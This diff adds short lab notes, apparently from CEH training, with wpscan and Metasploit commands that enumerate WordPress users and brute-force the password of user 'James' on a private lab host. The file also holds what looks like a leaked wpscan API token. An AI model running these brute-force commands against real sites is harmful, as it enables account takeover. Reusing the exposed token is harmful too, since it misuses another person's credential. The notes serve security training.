@@ -1,0 +1,16 @@
+Wordpress
+wpscan -url http://172.16.0.27:8080/CEH -u James -P /wordlist/password.txt
+
+wpscan --api-token "token" -url "URL of wordpress website" --enumerate u
+To get token: https://wpscan.com/profile
+YyN3pHzy3UpAhnwClO9S66VtPsJJ0TTl8bWvLSnaiyc
+
+service postgresql start
+msfconsole
+use auxiliary/scanner/http/wordpress_login_enum
+set PASS_FILE "password file location"
+set RHOSTS "IP address"
+set RPORT 8080
+set TARGETURI http://172.16.0.27:8080/CEH
+set USERNAME James
+run
